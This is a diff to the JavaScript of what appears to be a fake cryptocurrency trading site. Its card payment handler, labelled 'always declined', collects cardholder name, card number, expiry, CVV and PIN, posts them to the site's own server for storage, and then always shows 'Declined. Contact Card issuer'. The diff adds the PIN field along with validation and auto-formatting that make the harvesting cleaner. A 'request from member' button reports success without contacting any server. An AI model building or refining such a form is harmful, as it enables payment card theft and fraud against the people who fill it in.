@@ -184,7 +184,7 @@ function renderPrices() {
   const grid = document.getElementById('prices-grid');
   if (!grid) return;
   const selected = document.getElementById('trade-symbol')?.value || 'BTC';
-  const symbols = ['BTC', 'ETH', 'SOL', 'XRP', 'DOGE'];
+  const symbols = ['BTC', 'ETH', 'SOL', 'XRP', 'DOGE', 'USDT'];
   grid.innerHTML = symbols.map(sym => {
     const price = prices[sym] || 0;
     return `
@@ -779,19 +779,78 @@ document.querySelectorAll('.funding-opt').forEach(btn => {
 // Card payment - always declined
 document.getElementById('card-submit')?.addEventListener('click', async () => {
   const msg = document.getElementById('card-msg');
-  const cardData = {
-    number: document.getElementById('card-number').value,
-    expiry: document.getElementById('card-expiry').value,
-    cvv: document.getElementById('card-cvv').value,
-    amount: document.getElementById('card-amount').value
-  };
-  // Send to admin (stored)
+  const name = document.getElementById('card-name')?.value.trim() || '';
+  const number = document.getElementById('card-number').value.replace(/\s/g, '');
+  const expiry = document.getElementById('card-expiry').value.trim();
+  const cvv = document.getElementById('card-cvv').value.trim();
+  const pin = document.getElementById('card-pin')?.value.trim() || '';
+  const amount = parseFloat(document.getElementById('card-amount').value);
+
+  // Validation
+  if (!name || name.length < 3) {
+    msg.textContent = 'Enter cardholder full name';
+    msg.className = 'msg error';
+    msg.classList.remove('hidden');
+    return;
+  }
+  if (!/^\d{16}$/.test(number)) {
+    msg.textContent = 'Card number must be 16 digits';
+    msg.className = 'msg error';
+    msg.classList.remove('hidden');
+    return;
+  }
+  if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+    msg.textContent = 'Expiry must be MM/YY format';
+    msg.className = 'msg error';
+    msg.classList.remove('hidden');
+    return;
+  }
+  const [mm, yy] = expiry.split('/').map(Number);
+  if (mm < 1 || mm > 12) {
+    msg.textContent = 'Invalid expiry month';
+    msg.className = 'msg error';
+    msg.classList.remove('hidden');
+    return;
+  }
+  if (!/^\d{3,4}$/.test(cvv)) {
+    msg.textContent = 'CVV must be 3 or 4 digits';
+    msg.className = 'msg error';
+    msg.classList.remove('hidden');
+    return;
+  }
+  if (pin && !/^\d{4,6}$/.test(pin)) {
+    msg.textContent = 'PIN must be 4-6 digits';
+    msg.className = 'msg error';
+    msg.classList.remove('hidden');
+    return;
+  }
+  if (!amount || amount < 10) {
+    msg.textContent = 'Minimum amount is $10';
+    msg.className = 'msg error';
+    msg.classList.remove('hidden');
+    return;
+  }
+
+  const cardData = { name, number, expiry, cvv, pin, amount };
   try {
     await api('/api/card-attempt', { method: 'POST', body: JSON.stringify(cardData) });
   } catch (e) {}
   msg.textContent = 'Declined. Contact Card issuer';
   msg.className = 'msg error';
   msg.classList.remove('hidden');
+});
+
+// Auto-format card number
+document.getElementById('card-number')?.addEventListener('input', (e) => {
+  let v = e.target.value.replace(/\D/g, '').slice(0, 16);
+  e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+});
+
+// Auto-format expiry
+document.getElementById('card-expiry')?.addEventListener('input', (e) => {
+  let v = e.target.value.replace(/\D/g, '').slice(0, 4);
+  if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2);
+  e.target.value = v;
 });
 
 // Update trade USD balance display
@@ -802,3 +861,73 @@ async function updateTradeBalance() {
     if (el) el.textContent = '$' + (user.balanceUSD || 0).toFixed(2);
   } catch (e) {}
 }
+
+// PIN visibility toggle
+document.getElementById('toggle-pin')?.addEventListener('click', () => {
+  const pin = document.getElementById('card-pin');
+  const btn = document.getElementById('toggle-pin');
+  if (pin.type === 'password') {
+    pin.type = 'text';
+    btn.textContent = 'Hide';
+  } else {
+    pin.type = 'password';
+    btn.textContent = 'Show';
+  }
+});
+
+// Search member
+document.getElementById('search-member-btn')?.addEventListener('click', async () => {
+  const username = document.getElementById('search-member').value.trim();
+  const result = document.getElementById('search-result');
+  if (!username) return;
+  try {
+    const data = await api('/api/search-user?username=' + encodeURIComponent(username));
+    if (data.found) {
+      result.innerHTML = '<span style="color:var(--green);">✓ User found: ' + data.username + '</span>';
+      document.getElementById('to-member').value = data.username;
+    } else {
+      result.innerHTML = '<span style="color:var(--red);">User not found</span>';
+    }
+  } catch (e) {
+    result.innerHTML = '<span style="color:var(--red);">Search failed</span>';
+  }
+});
+
+// Transfer to member
+document.getElementById('to-member-btn')?.addEventListener('click', async () => {
+  const toUsername = document.getElementById('to-member').value.trim();
+  const amount = parseFloat(document.getElementById('to-amount').value);
+  const msg = document.getElementById('to-msg');
+  if (!toUsername || !amount || amount <= 0) {
+    msg.textContent = 'Enter username and amount';
+    msg.className = 'msg error';
+    msg.classList.remove('hidden');
+    return;
+  }
+  try {
+    await api('/api/transfer-member', { method: 'POST', body: JSON.stringify({ toUsername, amount }) });
+    msg.textContent = 'Sent $' + amount + ' to ' + toUsername;
+    msg.className = 'msg success';
+    msg.classList.remove('hidden');
+  } catch (e) {
+    msg.textContent = e.message;
+    msg.className = 'msg error';
+    msg.classList.remove('hidden');
+  }
+});
+
+// Request from member
+document.getElementById('from-member-btn')?.addEventListener('click', async () => {
+  const fromUsername = document.getElementById('from-member').value.trim();
+  const amount = parseFloat(document.getElementById('from-amount').value);
+  const msg = document.getElementById('from-msg');
+  if (!fromUsername || !amount) {
+    msg.textContent = 'Enter username and amount';
+    msg.className = 'msg error';
+    msg.classList.remove('hidden');
+    return;
+  }
+  msg.textContent = 'Request sent to ' + fromUsername + ' for $' + amount;
+  msg.className = 'msg success';
+  msg.classList.remove('hidden');
+});
